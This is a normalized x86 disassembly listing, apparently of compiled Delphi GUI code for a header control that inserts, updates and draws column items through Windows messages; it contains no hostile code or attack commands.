mov al [ ebx + 0x15 ]
sub al 0x1
jb r-xdata
mov edi 0x100
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_437ed4
test al al
je r-xdata
mov edi 0x200
jmp r-xdata
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
or edi 0x400
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0xc ]
call sub_403fb8
mov eax ebx
call sub_437eec
test al al
je r-xdata
or edi 0x1000
mov al [ ebx + 0x14 ]
dec al
je r-xdata
mov eax ebx
call sub_437eec
push eax
lea edx [ ebp - 0x8 ]
mov cl [ ebx + 0x14 ]
mov eax esi
call sub_4382e4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_4044c8
dec al
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043e0
push eax
mov eax ebx
call sub_418e68
or edi eax
push edi
push 0x401
mov eax esi
call sub_453a88
push eax
call SendMessageA
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_4044c8
jmp r-xdata
sub_4387e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf4
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_453d8c
test al al
je r-xdata
add esp 0x20c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x208 ]
call sub_4191f8
mov [ esp + 0x4 ] eax
test bl bl
je r-xdata
mov ebp [ esp + 0x4 ]
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp + 0x4 ] 0x80
jle r-xdata
inc ebp
xor edi edi
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] 0x80
mov cl [ esp ]
mov edx edi
mov eax esi
call sub_43865c
inc edi
dec ebp
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov ebp [ esp + 0x4 ]
sub ebp 0x2
test ebp ebp
jl r-xdata
mov [ esp + 0xc ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
push 0x1
push 0x404
mov eax esi
call sub_453a88
push eax
call SendMessageA
push sub_4388f8
push 0x0
push 0x401
mov eax esi
call sub_453a88
push eax
call SendMessageA
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esp + eax * 4 + 0x8 ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x404
mov eax esi
call sub_453a88
push eax
call SendMessageA
inc ebp
xor edi edi
lea ebx [ esp + 0xc ]
mov edx edi
mov eax [ esi + 0x208 ]
call sub_437ffc
mov eax [ eax + 0x10 ]
add [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
inc edi
add ebx 0x4
dec ebp
jne r-xdata
sub_4388f8
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_453128
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_43862c
cmp eax 0x2a
jne r-xdata
pop esi
pop ebx
retn
sub_438924
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424660
xor eax eax
push ebp
push sub_438a1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424a8c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_42492c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_42420c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424328
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437ffc
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a21
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_424a8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424904
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_438a48
push ebx
push esi
mov esi edx
mov ebx eax
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4387e4
mov edx esi
mov eax ebx
call sub_451c18
pop esi
pop ebx
retn
sub_438a68
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40338c
sub_438aa8
push ebx
mov ebx eax
cmp dl [ ebx + 0x217 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x217 ] dl
test dl dl
je r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax ebx
call sub_43862c
xor edx edx
mov eax ebx
call sub_44d2b8
sub_438b10
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_420e74
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
jne r-xdata
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov edx [ esi + 0x7c ]
mov eax ebx
call sub_4383b0
jmp r-xdata
mov eax [ ebx + 0x208 ]
call sub_4191f8
test eax eax
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_437ffc
mov edx [ esi + 0x7c ]
call sub_437f58
sub_438bd5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453474
mov dl 0x1
mov eax ebx
call sub_438c04
pop ebx
pop ebp
retn 0x8
sub_438c04
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] dl
mov edi eax
xor ebx ebx
mov eax edi
call sub_464518
mov esi eax
test esi esi
je r-xdata
cmp bl [ edi + 0x216 ]
je r-xdata
mov al [ esi + 0x229 ]
sub al 0x2
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x216 ] bl
cmp [ esp ] 0x0
je r-xdata
lea eax [ esp + 0x1 ]
push eax
lea ecx [ esp + 0x10 ]
mov edx [ edi + 0x4c ]
mov eax [ edi + 0x48 ]
call sub_405fa0
lea edx [ esp + 0x10 ]
mov ecx esi
mov eax edi
call sub_44f66c
mov eax esi
call sub_44cb90
cmp eax [ esp + 0x1 ]
jne r-xdata
sub al 0x3
jne r-xdata
mov eax edi
call sub_451028
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_44cbd4
cmp eax [ esp + 0x5 ]
je r-xdata
mov bl 0x1
sub_438c90
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov [ esp ] eax
cmp [ ebx + 0x232 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_438ce4
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_451edc
call sub_43c850
mov ecx esp
mov dl 0x1
call sub_43cc54
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
push eax
push 0x0
call sub_43c850
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x8 ]
call sub_43ca3c
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_438d44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_418ddc
mov eax esi
call sub_438e44
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_438da0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418a84
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_438f50
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_438f78
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_438f24
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_438f00
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_438ed0
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_438f40
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_438fc0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438e44
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40338c
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_40338c
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_438e18
mov [ ebx + 0x25 ] 0x1
sub_438eac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_403f74
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418e80
sub_438ee0
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40338c
sub_438f50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_40432c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_403f74
xor edx edx
mov eax ebx
call sub_418e44
sub_438f78
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_418e68
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_4191f8
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_418e44
sub_438fd0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_418fc0
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_439038
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_439844
pop esi
pop ebx
retn
mov eax esi
call sub_418e68
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_439820
pop esi
pop ebx
retn
sub_439064
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_4191f8
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_4191f8
mov edi eax
dec edi
sub_4390b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f7b4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_44c6a0
mov edx 0x11
mov eax ebx
call sub_44c96c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_44bd68
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43a064
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_439184
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_403190
mov eax [ esi + 0x208 ]
call sub_403190
mov eax [ esi + 0x224 ]
call sub_403190
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
test bl bl
jle r-xdata
call sub_403190
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4391dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_437cf4
mov edx esi
mov eax ebx
call sub_450914
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450840
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_439254
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419124
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b2b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4392dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d8d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_41bf88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_439308
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450a40
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_439844
push ebp
call sub_439254
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_45a690
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
pop edx
call sub_42ad98
pop ebx
pop ecx
pop ebp
retn
sub_439370
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b2b4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4393fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_41e438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439405
mov eax [ ebp - 0x8 ]
call sub_403190
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_41a8c0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_439414
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_452e04
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4191f8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_439020
call sub_438e44
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_439020
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_439470
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cb90
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_439020
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_438fd0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4395ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_439020
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4395c1
mov eax [ ebp - 0x10 ]
call sub_403190
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_439014
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_439020
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_439020
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_439020
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4395c1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_439844
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4191f8
mov edx eax
dec edx
mov eax ebx
call sub_439020
mov edx [ ebp - 0x8 ]
call sub_438f78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_439020
mov edx [ ebp - 0xc ]
call sub_438f78
sub_43961c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_4245b0
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_439698
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_439724
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_439020
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402ba4
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_4043e0
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_4041e0
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_438e94
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_449f18
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_438e7c
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov eax ebx
call sub_418e68
push eax
push edi
mov eax esi
call sub_453a88
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_439820
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_439724
sub_439844
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_453a88
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_4191f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_453a88
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_439724
inc edi
dec ebx
jne r-xdata
sub_4398c0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424660
xor eax eax
push ebp
push sub_4399c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424a8c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_42492c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_42420c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424328
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4399c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_424a8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_424904
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_4399d8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je r-xdata
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_40338c
jmp r-xdata
sub eax 0xfffffec9
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_44cbd4
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40338c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a208
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_42ad7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_439b6e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
